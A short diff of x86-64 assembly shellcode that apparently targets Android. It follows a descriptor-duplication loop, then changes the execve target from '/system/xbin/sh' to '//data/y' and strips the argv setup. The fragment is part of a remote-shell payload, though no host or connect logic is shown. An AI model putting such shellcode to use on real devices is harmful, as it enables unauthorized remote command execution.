@@ -114,24 +114,13 @@ dup_loop:
 		pop	rdx		; *envp[] = 0
 		push	rsi		; '\0'
 		;;;;mov	rdi, '//system/bin/sh'	; str
-		mov rdi, 'xbin/sh'
-		push rdi
-		mov	rdi, '/system/' ; str
-		push rdi
-		push rsp
+		mov	rdi, '//data/y'	; str
+		push	rdi
+		push	rsp
 		pop	rdi		; rdi = &str (char*)
-
-    push 0 ; argv[1] ; argv args in right to left order
-		push rdi ; argv[0]
-		push rsp ; rsp points to argv
-		pop rsi ; rsi points to argv
-		mov rdx, 0 ; rdx is envp
-
 		xor	rax, rax
 		mov	al, SYS_EXECVE
 		syscall
-
-    mov rdi, 7 ; rdi is exit code
 
 exit:
 		xor	rax, rax
